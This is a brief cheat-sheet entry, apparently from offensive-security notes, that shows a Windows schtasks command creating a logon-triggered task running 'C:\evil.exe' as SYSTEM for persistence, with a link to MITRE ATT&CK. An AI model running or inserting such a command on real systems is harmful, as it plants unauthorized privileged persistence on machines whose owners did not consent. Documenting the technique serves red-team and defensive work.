# Scheduled Task for Persistence

The following command creates a new scheculed task that executes `evil.exe`. This command requires `Administrator` privileges.

```powershell
schtasks /Create /SC ONLOGON /TN "My Task" /TR C:\evil.exe /RU SYSTEM
```

## Resources

- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/005/)